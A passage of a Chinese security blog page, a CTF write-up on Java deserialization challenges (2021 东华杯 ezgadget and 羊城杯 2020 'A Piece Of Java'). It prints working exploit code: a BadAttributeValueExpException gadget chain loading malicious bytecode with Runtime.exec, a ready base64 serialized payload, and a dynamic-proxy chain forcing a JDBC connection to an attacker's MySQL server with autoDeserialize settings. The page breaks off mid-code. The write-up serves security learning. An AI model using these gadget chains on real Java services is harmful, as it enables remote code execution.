@@ -1,0 +1,760 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Sp4rks3">
+  <meta name="keywords" content="博客">
+  
+    <meta name="description" content="2021东华杯 ezgadget题目地址一道关于Java反序列化的CTF题-东华杯ezgadget   qe53 题目分析WEB端有readobject路由，把输入的数据通过工具类解码，包装成ObjectInputStream类型，再调用readObject方法，所以这里可以作为反序列化的入口点  工具类Tools，负责base64编码、解码，序列化、反序列化  工具类ToStringBean，调">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从CTF学习JAVA安全">
+<meta property="og:url" content="https://sp4rks3.github.io/2025/02/07/JAVA%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E4%BB%8ECTF%E5%AD%A6%E4%B9%A0JAVA%E5%AE%89%E5%85%A8/index.html">
+<meta property="og:site_name" content="Sp4rks3&#39;s Blog">
+<meta property="og:description" content="2021东华杯 ezgadget题目地址一道关于Java反序列化的CTF题-东华杯ezgadget   qe53 题目分析WEB端有readobject路由，把输入的数据通过工具类解码，包装成ObjectInputStream类型，再调用readObject方法，所以这里可以作为反序列化的入口点  工具类Tools，负责base64编码、解码，序列化、反序列化  工具类ToStringBean，调">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://image.sp4rks.xyz/2025/02/image-20250206135138200.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2025/02/image-20250206112934536.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2025/02/image-20250206142513497.png">
+<meta property="og:image" content="https://image.sp4rks.xyz/2025/02/image-20250206200359967.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250218141820791.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250218144304130.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250219002819532.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250218234830492.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250218172315694.png">
+<meta property="og:image" content="c:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250218172759801.png">
+<meta property="article:published_time" content="2025-02-07T02:53:56.119Z">
+<meta property="article:modified_time" content="2025-02-19T05:25:18.709Z">
+<meta property="article:author" content="Sp4rks3">
+<meta property="article:tag" content="JAVA安全">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://image.sp4rks.xyz/2025/02/image-20250206135138200.png">
+  
+  
+  
+  <title>从CTF学习JAVA安全 - Sp4rks3&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sp4rks3.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null},"woyaola":null,"cnzz":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Sp4rks3&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="从CTF学习JAVA安全"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-02-07 10:53" pubdate>
+          2025年2月7日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          11 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">从CTF学习JAVA安全</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="2021东华杯-ezgadget"><a href="#2021东华杯-ezgadget" class="headerlink" title="2021东华杯 ezgadget"></a>2021东华杯 ezgadget</h1><h2 id="题目地址"><a href="#题目地址" class="headerlink" title="题目地址"></a>题目地址</h2><p><a target="_blank" rel="noopener" href="https://www.alipan.com/s/6eLwqsgBDUV">一道关于Java反序列化的CTF题-东华杯ezgadget</a>   qe53</p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>WEB端有readobject路由，把输入的数据通过工具类解码，包装成ObjectInputStream类型，再调用readObject方法，所以这里可以作为反序列化的入口点</p>
+<p><img src="https://image.sp4rks.xyz/2025/02/image-20250206135138200.png" srcset="/img/loading.gif" lazyload alt="image-20250206135138200"></p>
+<p>工具类Tools，负责base64编码、解码，序列化、反序列化</p>
+<p><img src="https://image.sp4rks.xyz/2025/02/image-20250206112934536.png" srcset="/img/loading.gif" lazyload alt="image-20250206112934536"></p>
+<p>工具类ToStringBean，调用了defineClass方法，并且通过newInstance()实例化对象</p>
+<p><img src="https://image.sp4rks.xyz/2025/02/image-20250206142513497.png" srcset="/img/loading.gif" lazyload alt="image-20250206142513497"></p>
+<p>看到这个我们就能想到：</p>
+<p>动态类加载：</p>
+<ul>
+<li>ToStringBean 继承自 ClassLoader，并且在 toString() 方法中使用 defineClass 动态加载由 ClassByte 指定的字节码。</li>
+</ul>
+<p>反序列化触发：</p>
+<ul>
+<li>在反序列化过程中会自动调用readObject() 方法。ToStringBean 实现了 Serializable 接口，只要有类的readObject()调用ToStringBean.toString()方法就可以实现代码执行。</li>
+</ul>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>反序列化入口选择BadAttributeValueExpException，这是CC5的入口，它会触发toString()方法</p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ezgame.ctf;<br><br><span class="hljs-keyword">import</span> com.ezgame.ctf.tools.ToStringBean;<br><span class="hljs-keyword">import</span> com.ezgame.ctf.tools.Tools;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><br><br><span class="hljs-comment">//redobject路由对data有反序列化</span><br><span class="hljs-comment">//BadAttributeValueExpException.readObject()-&gt;ToStringBean.toString()方法</span><br><span class="hljs-comment">//toStringBean的defineClass+newInstance</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;<br>        <span class="hljs-comment">//反射修改ToStringBean.ClassByte为恶意字节码</span><br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">classByteField</span> <span class="hljs-operator">=</span> toStringBean.getClass().getDeclaredField(<span class="hljs-string">&quot;ClassByte&quot;</span>);<br>        classByteField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\JAVA\\EzJava\\target\\classes\\com\\ezgame\\ctf\\Payload.class&quot;</span>));<br>        classByteField.set(toStringBean, bytes);<br><br>		<span class="hljs-comment">//通过BadAttributeValueExpException包装ToStringBean</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">123</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valField</span> <span class="hljs-operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valField.setAccessible(<span class="hljs-literal">true</span>);<br>        valField.set(badAttributeValueExpException, toStringBean);<br><br>        <span class="hljs-comment">//这一部分逻辑都是跟着readobject路由的条件写的</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeUTF(<span class="hljs-string">&quot;gadgets&quot;</span>);<br>        objectOutputStream.writeInt(<span class="hljs-number">2021</span>);<br>        objectOutputStream.writeObject(badAttributeValueExpException);<br><br><br>        <span class="hljs-type">byte</span>[] byteArray = byteArrayOutputStream.toByteArray();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> Tools.base64Encode(byteArray);<br>        System.out.printf(s);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ezgame.ctf;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Payload</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>序列化字符串</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">rO0ABXcNAAdnYWRnZXRzAAAH5XNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAXNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAGHQAEmNvbS5lemdhbWUuY3RmLkV4cHQACEV4cC5qYXZhdAAEbWFpbnNyACZqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlTGlzdPwPJTG17I4QAgABTAAEbGlzdHEAfgAHeHIALGphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVDb2xsZWN0aW9uGUIAgMte9x4CAAFMAAFjdAAWTGphdmEvdXRpbC9Db2xsZWN0aW9uO3hwc3IAE2phdmEudXRpbC5BcnJheUxpc3R4gdIdmcdhnQMAAUkABHNpemV4cAAAAAB3BAAAAAB4cQB+ABV4c3IAIWNvbS5lemdhbWUuY3RmLnRvb2xzLlRvU3RyaW5nQmVhbhPMVFon2dx5AgABWwAJQ2xhc3NCeXRldAACW0J4cHVyAAJbQqzzF/gGCFTgAgAAeHAAAAJ9yv66vgAAADQAJgoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABhMY29tL2V6Z2FtZS9jdGYvUGF5bG9hZDsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwAcAQAKU291cmNlRmlsZQEADFBheWxvYWQuamF2YQwACQAKBwAgDAAhACIBAARjYWxjDAAjACQBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAlAAoBABZjb20vZXpnYW1lL2N0Zi9QYXlsb2FkAQAQamF2YS9sYW5nL09iamVjdAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAIAAQAJAAoAAQALAAAALwABAAEAAAAFKrcAAbEAAAACAAwAAAAGAAEAAAAFAA0AAAAMAAEAAAAFAA4ADwAAAAgAEAAKAAEACwAAAGEAAgABAAAAErgAAhIDtgAEV6cACEsqtgAGsQABAAAACQAMAAUAAwAMAAAAFgAFAAAACAAJAAsADAAJAA0ACgARAAwADQAAAAwAAQANAAQAEQASAAAAEwAAAAcAAkwHABQEAAEAFQAAAAIAFg==<br></code></pre></td></tr></table></figure>
+
+<p>Burp Ctrl+U 对序列化字符串URL编码</p>
+<p><img src="https://image.sp4rks.xyz/2025/02/image-20250206200359967.png" srcset="/img/loading.gif" lazyload alt="image-20250206200359967"></p>
+<h2 id="坑点与总结"><a href="#坑点与总结" class="headerlink" title="坑点与总结"></a>坑点与总结</h2><p>坑点：传入参数时需要url编码，因为base64编码后存在+号，而http请求会把传参时会将+号识别为空格。base64没有空格符号，所以后端解码会报错。</p>
+<p>这题主要考察 <strong>反序列化</strong>、<strong>类加载</strong>、<strong>字节码执行</strong>，另外组长的视频适合反复观看<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV16h411z7o9?spm_id_from=333.788.videopod.episodes&vd_source=d195054a6a081ba07486dcc86c6ba707&p=4">Java反序列化漏洞专题-基础篇(21&#x2F;09&#x2F;05更新类加载部分)</a></p>
+<h1 id="羊城杯-2020-A-Piece-Of-Java"><a href="#羊城杯-2020-A-Piece-Of-Java" class="headerlink" title="[羊城杯 2020]A Piece Of Java"></a>[羊城杯 2020]A Piece Of Java</h1><h2 id="题目地址-1"><a href="#题目地址-1" class="headerlink" title="题目地址"></a>题目地址</h2><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020]A%20Piece%20Of%20Java">A Piece Of Java</a></p>
+<h2 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h2><p>把题目的jar添加为项目库，idea就会直接反编译了，先关注路由</p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250218141820791.png" srcset="/img/loading.gif" lazyload alt="image-20250218141820791"></p>
+<p>逻辑还是挺简单的：</p>
+<ul>
+<li><code>/index</code>获取参数<code>username、password</code>，将参数赋值给<code>userinfo</code>对象，并将该对象序列化存储到Cookie的data中</li>
+<li><code>/hello</code>获得cookie中的data并反序列化，并调用info.getAllInfo()，将返回的数据显示到hello.html中的<code>info</code>参数</li>
+</ul>
+<p>嗯？那不直接可以CC链打了么？没那么简单，接着我们看重写的deserialize方法，它其实是有限制的</p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250218144304130.png" srcset="/img/loading.gif" lazyload alt="image-20250218144304130"></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-comment">&lt;!-- serialkiller.conf --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">config</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">refresh</span>&gt;</span>6000<span class="hljs-tag">&lt;/<span class="hljs-name">refresh</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">mode</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- set to &#x27;false&#x27; for blocking mode --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">profiling</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">profiling</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">mode</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">blacklist</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">blacklist</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">whitelist</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">regexp</span>&gt;</span>gdufs\..*<span class="hljs-tag">&lt;/<span class="hljs-name">regexp</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">regexp</span>&gt;</span>java\.lang\..*<span class="hljs-tag">&lt;/<span class="hljs-name">regexp</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">whitelist</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">config</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>可以看到白名单，<strong>也就是反序列化的目标收到了限制，只能是白名单中的包下的类才能反序列化</strong>。</p>
+<p>接着调用了Info接口的getAllInfo()方法，实现Info接口的有两个类UserInfo和DatabaseInfo这里UserInfo并没有什么用，我们看DatabaseInfo类，其中有checkAllInfo()方法调用了connect方法，connect()方法使用JDBC连接了数据库，这里就可以考虑JDBC反序列化，也就绕过了上面反序列化的限制。</p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250219002819532.png" srcset="/img/loading.gif" lazyload alt="image-20250219002819532"></p>
+<p>问题是如何调用checkAllInfo()方法，题目中还给了个InfoInvocationHandler类它实现了InvocationHandler类，并且**invoke()**方法中调用了checkAllInfo()方法。</p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250218234830492.png" srcset="/img/loading.gif" lazyload alt="image-20250218234830492"></p>
+<p>思路就有了，使用动态代理，根据动态代理的特性，代理对象调用任意方法时就会触发<code>invoke()</code>方法。</p>
+<p><strong>调用链</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">反序列化-&gt;info.getAllinfo()-&gt;(动态代理)InfoInvocationHandler.invoke()-&gt;Databaseinfo.checkAllInfo()-&gt;Databaseinfo-&gt;connect()<br></code></pre></td></tr></table></figure>
+
+<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">DatabaseInfo</span> <span class="hljs-variable">databaseinfo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DatabaseInfo</span>();<br>        databaseinfo.setHost(<span class="hljs-string">&quot;JDBC恶意服务器地址&quot;</span>);<br>        databaseinfo.setPort(<span class="hljs-string">&quot;JDBC恶意服务器端口&quot;</span>);<br>        databaseinfo.setUsername(<span class="hljs-string">&quot;1&quot;</span>);<br>        <span class="hljs-comment">//JDBC-Mysql 8.0.19 payload</span><br>        databaseinfo.setPassword(<span class="hljs-string">&quot;1&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>);<br><br><br>        <span class="hljs-type">InfoInvocationHandler</span> <span class="hljs-variable">infoInvocationHandler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InfoInvocationHandler</span>(databaseinfo);<br>        Info info=(Info) Proxy.newProxyInstance(databaseinfo.getClass().getClassLoader(),databaseinfo.getClass().getInterfaces(), infoInvocationHandler);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(info);<br>        objectOutputStream.close();<br><br>        String str=<span class="hljs-keyword">new</span> <span class="hljs-title 